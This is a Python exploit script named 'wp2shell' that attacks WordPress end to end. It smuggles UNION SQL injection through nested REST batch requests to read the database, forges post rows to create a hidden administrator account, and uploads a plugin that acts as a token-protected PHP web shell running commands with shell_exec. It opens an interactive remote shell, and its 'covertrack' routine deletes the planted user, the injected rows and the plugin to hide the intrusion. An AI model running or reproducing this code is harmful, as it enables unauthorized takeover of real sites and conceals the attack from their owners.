from __future__ import annotations

import base64
import hashlib
import http.cookiejar
import io
import json
import re
import secrets
import shlex
import sys
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile

_DESYNC = {"method": "POST", "path": "///"}
_ITEM = "/wp/v2/posts/999999"
_POST_DATE = "2020-01-01 00:00:00"
_OEMBED_SIZE = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'
_MARKER = "WP2SHELL"
_CWD_MARK = "__wp2shellcwd__"


class TargetError(Exception):
    pass


class Client:
    def __init__(self, base: str, timeout: float = 30.0):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self._opener = urllib.request.build_opener()
        self._opener.addheaders = [("User-Agent", "wp2shell-union")]

    def post(self, payload: dict, timeout: float | None = None) -> tuple[int, str]:
        url = f"{self.base}/?rest_route=/batch/v1"
        req = urllib.request.Request(
            url,
            data=json.dumps(payload).encode(),
            method="POST",
            headers={"Content-Type": "application/json"},
        )
        return self._do(req, timeout or self.timeout)

    def get(self, path: str, timeout: float | None = None) -> tuple[int, str]:
        url = self.base + (path if path.startswith("/") else "/" + path)
        return self._do(urllib.request.Request(url, method="GET"), timeout or self.timeout)

    def _do(self, req, timeout: float) -> tuple[int, str]:
        try:
            resp = self._opener.open(req, timeout=timeout)
            return resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", "replace")
        except OSError as exc:
            raise TargetError(f"cannot reach {self.base}: {exc}") from None


def mysql_hex(text: str) -> str:
    return f"0x{text.encode().hex()}" if text else "''"


def wp_posts_tuple(row_id, *, body="", title="", status="publish", slug="",
                   parent=0, kind="post", author=1) -> str:
    cols = [
        str(row_id), str(author),
        mysql_hex(_POST_DATE), mysql_hex(_POST_DATE),
        mysql_hex(body), mysql_hex(title), "''",
        mysql_hex(status), mysql_hex("closed"), mysql_hex("closed"), "''",
        mysql_hex(slug), "''", "''",
        mysql_hex(_POST_DATE), mysql_hex(_POST_DATE), "''",
        str(parent), "''", "0", mysql_hex(kind), "''", "0", "0",
    ]
    return ",".join(cols)


def _union_payload(author_not_in: str) -> dict:
    query = urllib.parse.urlencode(
        {"author_exclude": author_not_in, "orderby": "none", "per_page": "500"}
    )
    inner = {"requests": [
        _DESYNC,
        {"method": "GET", "path": _ITEM + "?" + query},
        {"method": "GET", "path": "/wp/v2/posts"},
    ]}
    return {"requests": [
        _DESYNC,
        {"method": "POST", "path": "/wp/v2/posts", "body": inner},
        {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
    ]}


class Union:
    _COLUMNS = 23
    _TITLE = 6
    _RE = re.compile(r"\|\|([0-9A-Fa-f]*)\|\|")
    _PUBLISH = "0x7075626c697368"
    _POST = "0x706f7374"
    _DATE = "0x323032302d30312d30312030303a30303a3030"

    def __init__(self, client: Client):
        self.c = client

    def read(self, expr: str) -> str | None:
        status, body = self.c.post(_union_payload(
            f"1) AND 1=0 UNION SELECT {self._cols(expr)}-- -"
        ), timeout=60)
        if status >= 400:
            return None
        m = self._RE.search(body)
        if not m:
            return None
        digits = m.group(1)
        if len(digits) % 2:
            digits = digits[:-1]
        try:
            return bytes.fromhex(digits).decode("utf-8", "replace")
        except ValueError:
            return None

    def integer(self, expr: str) -> int:
        v = (self.read(f"SELECT ({expr})") or "").strip()
        if not v.lstrip("-").isdigit():
            raise RuntimeError(f"expected int from {expr!r}, got {v!r}")
        return int(v)

    def available(self) -> bool:
        return self.read("SELECT 0x4f4b") == "OK"

    def _cols(self, expr: str) -> str:
        out = []
        for i in range(1, self._COLUMNS + 1):
            if i == 1:
                out.append("999999")
            elif i in (3, 4, 15, 16):
                out.append(self._DATE)
            elif i == self._TITLE:
                out.append(f"CONCAT(0x7c7c,HEX(CAST(({expr})AS CHAR)),0x7c7c)")
            elif i == 8:
                out.append(self._PUBLISH)
            elif i == 21:
                out.append(self._POST)
            else:
                out.append(str(i))
        return ",".join(out)


def render_rows(client: Client, rows: list[str], tail: list[dict] | None = None):
    union_payload = "1) AND 1=0 UNION ALL SELECT " + " UNION ALL SELECT ".join(rows) + " -- -"
    query = urllib.parse.urlencode(
        {"author_exclude": union_payload, "per_page": "500", "orderby": "none"}
    )
    requests = [
        {"method": "GET", "path": "http://:"},
        {"method": "GET", "path": _ITEM + "?" + query},
        {"method": "GET", "path": "/wp/v2/posts"},
    ]
    if tail:
        requests.extend(tail)
    outer = {"requests": [
        {"method": "POST", "path": "http://:"},
        {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": requests}},
        {"method": "POST", "path": "/batch/v1"},
    ]}
    status, _ = client.post(outer, timeout=60)
    if status >= 400:
        raise TargetError(f"batch render failed: HTTP {status}")


class AdminCreator:
    def __init__(self, client: Client):
        self.c = client
        self.sqli = Union(client)
        self.created: list[int] = []

    def create(self):
        if not self.sqli.available():
            raise RuntimeError("UNION SQLi not available on target")

        nonce = secrets.token_hex(6)
        embed_urls = self._embed_urls(nonce)
        self._seed_oembed(embed_urls)

        posts_table = self._posts_table()
        prefix = posts_table[:-5]
        admin_id = self._first_admin_id(prefix)
        backing = self._oembed_ids(posts_table, embed_urls)

        username = f"wp2_{nonce}"
        password = f"Wp2!{secrets.token_urlsafe(15)}"
        email = f"{username}@wp2shell.invalid"

        self._poison(backing, admin_id, username, password, email)
        return username, password, admin_id

    def _embed_urls(self, nonce: str) -> list[str]:
        for route in ("/wp/v2/posts", "/wp/v2/pages"):
            status, body = self.c.get(f"/?rest_route={urllib.parse.quote(route)}&per_page=1&_fields=link")
            if status >= 400:
                continue
            try:
                items = json.loads(body)
            except ValueError:
                continue
            if items and items[0].get("link"):
                sp = urllib.parse.urlsplit(items[0]["link"])
                return [urllib.parse.urlunsplit((sp.scheme, sp.netloc, sp.path, sp.query, f"{nonce}{i}")) for i in range(3)]
        raise RuntimeError("no public post/page found to seed oembed")

    def _seed_oembed(self, embed_urls: list[str]):
        content = "".join(f'[embed width="500" height="750"]{u}[/embed]' for u in embed_urls)
        render_rows(self.c, [wp_posts_tuple(0, body=content, title="seed", slug="seed")])

    def _posts_table(self) -> str:
        name = self.sqli.read(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
            "WHERE TABLE_SCHEMA=DATABASE() AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
            "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1"
        )
        if not name or not re.fullmatch(r"[A-Za-z0-9_$]+", name):
            raise RuntimeError("could not retrieve wp_posts table name")
        return name

    def _first_admin_id(self, prefix: str) -> int:
        cap_key = mysql_hex(prefix + "capabilities")
        cap_val = mysql_hex('s:13:"administrator";b:1;')
        return self.sqli.integer(
            f"SELECT u.ID FROM `{prefix}users` u "
            f"JOIN `{prefix}usermeta` m ON m.user_id=u.ID "
            f"WHERE m.meta_key={cap_key} AND INSTR(m.meta_value,{cap_val})>0 "
            "ORDER BY u.ID LIMIT 1"
        )

    def _oembed_ids(self, posts_table: str, embed_urls: list[str]) -> list[int]:
        ids = []
        for u in embed_urls:
            cache_name = hashlib.md5((u + _OEMBED_SIZE).encode()).hexdigest()
            rid = self.sqli.integer(
                f"SELECT ID FROM `{posts_table}` "
                "WHERE post_type=0x6f656d6265645f6361636865 "
                f"AND post_name=0x{cache_name.encode().hex()} "
                "ORDER BY ID DESC LIMIT 1"
            )
            if rid < 1:
                raise RuntimeError("could not retrieve oembed_cache ID")
            ids.append(rid)
        if len(set(ids)) != 3:
            raise RuntimeError("3 oembed_cache IDs not unique")
        return ids

    def _poison(self, backing: list[int], admin_id: int, user: str, pwd: str, email: str):
        outer_id = 1800000000 + secrets.randbelow(100000000)
        nav_id = outer_id + 1
        inner_id = outer_id + 2
        changeset_id, cache_id, request_id = backing
        self.created.extend([changeset_id, cache_id, request_id, outer_id, nav_id, inner_id])

        changeset = json.dumps({
            f"nav_menu_item[{nav_id}]": {
                "type": "nav_menu_item", "user_id": admin_id,
                "value": {
                    "object_id": 0, "object": "", "menu_item_parent": 0, "position": 0,
                    "type": "custom", "title": "generated", "url": "https://example.invalid/",
                    "target": "", "attr_title": "", "description": "", "classes": "", "xfn": "",
                    "status": "publish", "nav_menu_term_id": 0, "_invalid": False,
                },
            },
        }, separators=(",", ":"))

        user_body = {"username": user, "password": pwd, "email": email, "roles": ["administrator"]}
        rows = [
            wp_posts_tuple(0, body=f'[embed width="500" height="750"]{self._embed_urls("x")[0]}[/embed]',
                           title="trigger", slug="trigger"),
            wp_posts_tuple(changeset_id, body=changeset, title="changeset",
                           status="future", slug=str(uuid.uuid4()), parent=outer_id,
                           kind="customize_changeset"),
            wp_posts_tuple(outer_id, body="outer", title="outer", status="draft",
                           slug="outer", parent=changeset_id),
            wp_posts_tuple(cache_id, title="cache", slug="cache", parent=changeset_id),
            wp_posts_tuple(nav_id, body="nav", title="nav", slug="nav",
                           parent=request_id, kind="nav_menu_item"),
            wp_posts_tuple(request_id, body="parse", title="parse", status="parse",
                           slug="parse", parent=inner_id, kind="request"),
            wp_posts_tuple(inner_id, body="inner", title="inner", status="draft",
                           slug="inner", parent=request_id),
        ]
        tail = [
            {"method": "POST", "path": "/wp/v2/users", "body": user_body},
            {"method": "POST", "path": "/wp/v2/users", "body": user_body},
        ]
        render_rows(self.c, rows, tail)


class Shell:
    def __init__(self, base: str):
        self.base = base.rstrip("/")
        self.slug = "wp2shell_" + secrets.token_hex(4)
        self.token = secrets.token_hex(16)
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar))
        self.opener.addheaders = [("User-Agent", "wp2shell-union")]

    def login(self, user: str, pwd: str) -> bool:
        self._get("/wp-login.php")
        self._post("/wp-login.php", {
            "log": user, "pwd": pwd, "wp-submit": "Log In",
            "redirect_to": f"{self.base}/wp-admin/", "testcookie": "1",
        })
        return any(c.name.startswith("wordpress_logged_in") for c in self.jar)

    def upload(self) -> str:
        page = self._get("/wp-admin/plugin-install.php?tab=upload")
        nonce = self._nonce(page)
        if not nonce:
            raise RuntimeError("could not retrieve plugin upload nonce")
        body, ct = self._multipart(
            {"_wpnonce": nonce, "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload",
             "install-plugin-submit": "Install Now"},
            {"pluginzip": (f"{self.slug}.zip", self._zip())},
        )
        self._post("/wp-admin/update.php?action=upload-plugin", body, {"Content-Type": ct})
        return f"/wp-content/plugins/{self.slug}/{self.slug}.php"

    def run(self, path: str, cmd: str) -> str | None:
        q = urllib.parse.urlencode({"t": self.token, "c": cmd})
        out = self._get(f"{path}?{q}")
        m = re.search(rf"{_MARKER}::(.*?)::END", out, re.S)
        return m.group(1) if m else None

    def delete_user(self, path: str, username: str, reassign: int) -> bool:
        q = urllib.parse.urlencode({"t": self.token, "delete_user": username, "reassign": str(reassign)})
        out = self._get(f"{path}?{q}")
        m = re.search(rf"{_MARKER}::(.*?)::END", out, re.S)
        return bool(m and m.group(1).strip() == "deleted")

    def rm_plugin(self, path: str) -> bool:
        self.run(path, 'd=$(pwd); case "$d" in */wp-content/plugins/*) cd / && rm -rf "$d";; esac')
        try:
            self._get(path)
            return False
        except urllib.error.HTTPError as e:
            return e.code == 404
        except OSError:
            return False

    def _get(self, p: str) -> str:
        return self._open(self.base + p)
    def _post(self, p, data, headers=None):
        if isinstance(data, dict):
            data = urllib.parse.urlencode(data).encode()
        return self._open(urllib.request.Request(self.base + p, data=data, headers=headers or {}))
    def _open(self, t):
        try:
            return self.opener.open(t, timeout=30).read().decode("utf-8", "replace")
        except urllib.error.HTTPError:
            raise
        except OSError as e:
            raise TargetError(f"cannot reach {self.base}: {e}") from None

    def _zip(self) -> bytes:
        php = (
            "<?php\n"
            "/*\nPlugin Name: wp2shell\nDescription: tmp runner\n*/\n"
            f"if (hash_equals('{self.token}',(string)($_GET['t']??'')) && isset($_GET['c'])) {{\n"
            "  chdir(__DIR__);\n"
            f"  echo '{_MARKER}::' . shell_exec((string)$_GET['c']) . '::END';\n"
            f"}} elseif (hash_equals('{self.token}',(string)($_GET['t']??'')) && isset($_GET['delete_user'])) {{\n"
            "  require_once dirname(__DIR__,3).'/wp-load.php';\n"
            "  require_once ABSPATH.'wp-admin/includes/user.php';\n"
            "  $u=get_user_by('login',(string)$_GET['delete_user']);\n"
            "  $ok=$u?wp_delete_user((int)$u->ID,(int)($_GET['reassign']??0)):false;\n"
            f"  echo '{_MARKER}::' . ($ok?'deleted':'failed') . '::END';\n"
            "}\n"
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr(f"{self.slug}/{self.slug}.php", php)
        return buf.getvalue()

    @staticmethod
    def _nonce(html: str) -> str | None:
        m = re.search(r'action="[^"]*action=upload-plugin".*?name="_wpnonce"[^>]*value="([0-9a-f]+)"', html, re.S)
        if m:
            return m.group(1)
        m = re.search(r'<input[^>]*name="_wpnonce"[^>]*value="([0-9a-f]+)"', html)
        return m.group(1) if m else None

    @staticmethod
    def _multipart(fields, files):
        b = "----wp2shell" + uuid.uuid4().hex
        buf = io.BytesIO()
        for k, v in fields.items():
            buf.write(f"--{b}\r\n".encode())
            buf.write(f'Content-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode())
        for k, (fn, content) in files.items():
            buf.write(f"--{b}\r\n".encode())
            buf.write(f'Content-Disposition: form-data; name="{k}"; filename="{fn}"\r\n'.encode())
            buf.write(b"Content-Type: application/octet-stream\r\n\r\n" + content + b"\r\n")
        buf.write(f"--{b}--\r\n".encode())
        return buf.getvalue(), f"multipart/form-data; boundary={b}"


def repl(shell: Shell, path: str):
    pwd = shell.run(path, "pwd")
    cwd = (pwd or "/").strip() or "/"
    while True:
        try:
            line = input(f"{cwd} $ ")
        except (EOFError, KeyboardInterrupt):
            print()
            return
        cmd = line.strip()
        if not cmd:
            continue
        if cmd in ("exit", "quit"):
            return
        out = shell.run(path, f"cd {shlex.quote(cwd)} 2>/dev/null; {cmd}; printf '{_CWD_MARK}%s' \"$(pwd)\"")
        if out is None:
            continue
        body, mark, tail = out.rpartition(_CWD_MARK)
        if mark:
            cwd = tail.strip() or cwd
            out = body
        if out.rstrip("\n"):
            print(out.rstrip("\n"))


def covertrack(shell: Shell, path: str, admin_username: str, admin_id: int, created_ids: list[int]):
    try:
        shell.delete_user(path, admin_username, admin_id)
    except Exception:
        pass

    ids = sorted(set(i for i in created_ids if i > 0))
    if ids:
        id_list = ",".join(str(i) for i in ids)
        php = (
            "require_once dirname(__DIR__,3).'/wp-load.php';"
            "global $wpdb;"
            f"$ids=array({id_list});"
            "$in=implode(',',array_map('intval',$ids));"
            "$wpdb->query(\"DELETE FROM {$wpdb->postmeta} WHERE post_id IN ($in)\");"
            "$wpdb->query(\"DELETE FROM {$wpdb->posts} WHERE ID IN ($in)\");"
            "$wpdb->query(\"DELETE FROM {$wpdb->options} WHERE option_name LIKE '_transient_%changeset%' OR option_name LIKE '_site_transient_%changeset%'\");"
            "echo 'CLEANED';"
        )
        try:
            shell.run(path, f"php -r {shlex.quote(php)}")
        except Exception:
            pass

    try:
        shell.rm_plugin(path)
    except Exception:
        pass


def main() -> int:
    if len(sys.argv) != 2:
        return 2
    base = sys.argv[1]
    client = Client(base)

    creator = AdminCreator(client)
    if not creator.sqli.available():
        return 1

    user, pwd, admin_id = creator.create()

    shell = Shell(base)
    if not shell.login(user, pwd):
        return 1

    path = shell.upload()

    try:
        repl(shell, path)
    finally:
        covertrack(shell, path, user, admin_id, creator.created)

    return 0


if __name__ == "__main__":
    sys.exit(main())